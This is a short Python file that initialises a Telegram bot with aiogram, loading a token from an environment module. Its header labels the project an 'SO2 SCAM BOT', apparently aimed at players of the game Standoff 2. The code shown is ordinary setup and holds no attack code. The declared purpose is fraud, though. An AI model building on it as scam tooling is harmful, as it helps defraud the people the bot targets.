# SO2 SCAM BOT BY github.com/Vlad2030

from aiogram import Bot, Dispatcher, types

from modules import env

# Авторизация бота
bot: classmethod = Bot(
    token=env.TOKEN,
    parse_mode=types.ParseMode.HTML,
)
dp: classmethod = Dispatcher(bot)
